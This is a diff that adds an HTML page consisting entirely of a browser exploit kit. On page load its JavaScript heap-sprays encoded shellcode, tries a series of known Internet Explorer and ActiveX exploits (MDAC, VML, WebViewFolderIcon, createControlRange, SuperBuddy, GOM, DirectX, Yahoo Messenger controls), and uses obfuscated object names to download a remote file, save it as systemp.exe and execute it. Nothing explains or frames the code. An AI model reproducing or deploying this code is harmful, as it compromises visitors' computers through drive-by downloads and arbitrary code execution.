@@ -1,0 +1,198 @@
+<html xmlns:v="urn:schemas-microsoft-com:vml"><head><style>v\:* { behavior: url(#default#VML); }</style></head><body>
+<SCRIPT language="javascript">
+        var p_url = "";
+	var p_hSTA = 0x0c0c0c0c;
+	var p_pLC = unescape("%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063");
+	var p_hBS = 0x400000;
+	var p_pLS = p_pLC.length * 2;
+	var p_sSS = p_hBS - (p_pLS+0x38);
+	var p_sS = unescape("%u9090%u9090");
+function bo()
+{
+	p_sS = getp_sS(p_sS,p_sSS);
+	p_hB = (p_hSTA - 0x400000)/p_hBS;
+	p_m = new Array();
+
+	for (i=0;i<p_hB;i++)
+	{
+		p_m[i] = p_sS + p_pLC;
+	}
+	function getp_sS(p_sS, p_sSS)
+	{
+		while (p_sS.length*2<p_sSS)
+		{
+			p_sS += p_sS;
+		}
+		p_sS = p_sS.substring(0,p_sSS/2);
+		return p_sS;
+	}
+}
+//------------------
+function MDAC(){
+a1="ob"; a2="je"; a3="ct"; a4="i"; a5="d"; a6="re"; a7="te"; a8="rer"; a9="cl"; a10="ass"; a11="id"; a12="cls";
+b1="id:"; b2="BD9"; b3="6C5"; b4="56-6"; b5="5A3"; b6="-11"; b7="D0-"; b8="983"; b9="A-00C"; b10="04FC"; b11="29E"; b12="36";
+c1="ad"; c2="od"; c3="b.s"; c4="tr"; c5="eam"; c6="She"; c7="ll."; c8="App"; c9="lic"; c10="ati"; c11="on"; c12="msx";
+d1="ml2"; d2=".XML"; d3="HT"; d4="TP"; d5="G"; d6="E"; d7="T"; d8= 0; d9=""; d10=""; d11=""; d12="";
+
+var reterer = document.createElement(a1+a2+a3);
+reterer.setAttribute(a4+a5,a6+a7+a8);
+reterer.setAttribute(a9+a10+a11,a12+b1+b2+b3+b4+b5+b6+b7+b8+b9+b10+b11+b12);
+
+try{
+var ertsdg = reterer.CreateObject(c1+c2+c3+c4+c5,"");
+var d8 = 1;
+}
+catch(e){}
+try{
+var ioiouio = reterer.CreateObject(c6+c7+c8+c9+c10+c11,"");
+var d8 = 1;
+}
+catch(e){}
+if(d8 == 1)
+{
+try
+{
+var tfhdfg = reterer.CreateObject(c12+d1+d2+d3+d4,"");
+tfhdfg.open(d5+d6+d7,p_url,false);
+tfhdfg.send();
+ertsdg.type = 1;
+ertsdg.open();
+ertsdg.Write(tfhdfg.responseBody);
+var rndmzz = Math.round(Math.random()*99999);
+dsfsdf = "..\\systemp.exe";
+ertsdg.SaveToFile(dsfsdf,2);
+ioiouio.ShellExecute(dsfsdf);
+return 1;
+}
+catch(e){}
+}
+}
+//------------------
+function VML()
+{
+	try {
+document.write('<div id="oVML"></div>');
+obj="<v:rect><v:fill method = '";
+lstr="&#x0606;&#x0606;&#x0606;";
+for (i=0; i<3500; ++i) {
+obj=obj + lstr;
+}
+obj=obj+"'></v:rect></v:fill>";
+document.getElementById("oVML").innerHTML=obj;
+	} catch(e) {}
+	return 0;
+}
+//-----------------
+function WVF()
+{
+	for (var i=0;i<128;i++)
+	{
+		try{ 
+		    var rer1 = 0x7ffffffe;
+			var rer2 = 0x0c0c0c0c;
+			var tfasar = new ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1');
+			tfasar.setSlice(rer1, rer2, rer2,rer2);
+		} catch(e){}
+         return 0;
+	}
+}
+//-------------------
+function Createrange()
+{
+	try {
+ugric=unescape("%u0"+"d0d%u0"+"d0d");
+
+while(ugric.length<0x40000) ugric+=ugric;
+ugric=ugric.substring(0,0x3ffe4-p_pLC.length);
+
+bublic=new Array();
+
+for(i=bublic;i<450;i++)
+bublic[i]=ugric+p_pLC;
+
+zorro=Math.ceil(0xd0d0d0d);
+
+document.write('<object classid="CLS"+"ID"+":EC44"+"4C"+"B6-3"+"E7E-4"+"865-B1C"+"3-0D"+"E72"+"EF3"+"9B"+"3F"></object>');
+zorro = document.scripts[0].createControlRange().length;
+	} catch(e) {}
+	return 0;
+}
+//-------------------
+function SuperBuddy() {
+
+	try {
+		var buddy = new ActiveXObject('Sb.SuperBuddy.1');
+
+		if (buddy) {
+			buddy.LinkSBIcons(0x0c0c0c0c);
+		}
+	} catch(e) {}
+
+	return 0;
+}
+//-------------------
+function AudioFile()
+{
+	try {
+		var mmed = document.createElement("object");
+		mmed.setAttribute("classid", "clsid:77829F14-D911-40FF-A2F0-D11DB8D6D0BC");
+
+		var mms='';
+		for(var i=0;i<4120;i++) { mms += "A"; }
+	
+		mms+="\x0c\x0c\x0c\x0c";
+		mmed.SetFormatLikeSample(mms);
+	} catch(e) { }
+}
+//-------------------
+function GOM()
+{
+	var sURL='';
+	for(var i=0;i<510;i++) {
+		sURL += unescape("%0c");
+	}
+
+	var GomManager = new ActiveXObject('GomWebCtrl.GomManager.1');
+	GomManager.OpenURL(sURL);
+}
+//-------------------
+function DirectX()
+{
+var mesto = 0x0D0D0D0D;
+var razm_block = 0x400000;
+var bloki = (mesto - razm_block) / razm_block;
+var sprey = unescape("%u0D0D%u0D0D");
+var navremya = "\x0D\x0D\x0D\x0D";
+var navremya_size = 1044;
+while((sprey.length * 2) < razm_block) sprey += sprey;
+sprey = sprey.substring(0, razm_block - p_pLC.length);
+pamyat = new Array();
+for(i = 0; i < bloki; i++) pamyat[i] = sprey + p_pLC;
+while(navremya.length < (navremya_size * 2)) navremya += navremya;
+navremya = navremya.substring(0, navremya_size);
+document.write('<object id="obj" classid="clsid:201EA564-A6F6-11D1-811D-00C04FB6BD36"></object>');
+obj.SourceUrl = navremya;
+location.reload();
+}
+//-------------------
+function YM()
+{
+document.write("<object classid='clsid:DCE2F8B1-A520-11D4-8FD0-00D0B7730277' id='target1'></object>");
+document.write("<object classid='clsid:9D39223E-AE8E-11D4-8FD3-00D0B7730277' id='target2'></object>");
+bigblock=unescape("%u"+nop+nop+"%u"+nop+nop);
+slspace=20+p_pLC.length
+while(bigblock.length<slspace)bigblock+=bigblock;
+fillblock=bigblock.substring(0,slspace);
+block=bigblock.substring(0,bigblock.length-slspace);
+while(block.length+slspace<0x40000)block=block+block+fillblock;
+memory=new Array();
+for(x=0;x<800;x++){memory[x]=block+p_pLC}
+buffer='\x0a';
+while(buffer.length<5000)buffer+='\x0a\x0a\x0a\x0a';
+try{try{target1.server=buffer;target1.initialize();target1.send()}
+catch(e){target2.server=buffer;target2.receive();}}catch(e){}
+}
+//-------------------
+if (MDAC()||Createrange()||bo()||VML()||WVF()||SuperBuddy()||AudioFile()||GOM()||DirectX()||YM()) { }
+</script>
+</body></html>
